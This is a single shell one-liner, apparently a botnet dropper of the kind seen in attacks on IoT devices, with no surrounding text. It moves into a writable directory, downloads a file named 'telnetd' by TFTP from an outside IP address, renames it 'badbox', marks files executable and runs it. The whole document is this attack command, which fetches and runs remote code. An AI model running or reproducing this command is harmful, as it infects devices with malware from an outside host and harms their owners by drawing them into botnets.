cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 212.237.53.46;cat telnetd >badbox;chmod +x *;./badbox
